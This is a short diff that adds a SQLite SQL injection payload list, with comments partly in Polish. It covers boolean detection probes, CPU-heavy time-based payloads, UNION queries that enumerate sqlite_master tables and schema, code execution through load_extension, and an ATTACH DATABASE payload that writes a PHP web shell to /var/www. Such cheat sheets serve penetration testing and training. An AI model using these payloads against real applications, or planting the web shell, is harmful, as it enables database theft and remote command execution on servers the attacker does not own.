@@ -1,0 +1,19 @@
+# === Detection ===
+'
+' AND 1=1-- -
+' AND 1=2-- -
+
+# === Time-based (SQLite ma slabe time funcs — heavy CPU) ===
+' AND randomblob(100000000)-- -
+' AND (SELECT count(*) FROM sqlite_master,sqlite_master,sqlite_master)-- -
+
+# === Enumeration ===
+' UNION SELECT sqlite_version(),2,3-- -
+' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'-- -
+' UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table'-- -
+
+# === RCE via load_extension (rzadko enabled) ===
+'; SELECT load_extension('/tmp/lib.so','entry')-- -
+
+# === ATTACH database (write to arbitrary path) ===
+'; ATTACH DATABASE '/var/www/x.php' AS x; CREATE TABLE x.y(c text); INSERT INTO x.y VALUES('<?php system($_GET[0]);?>')-- -
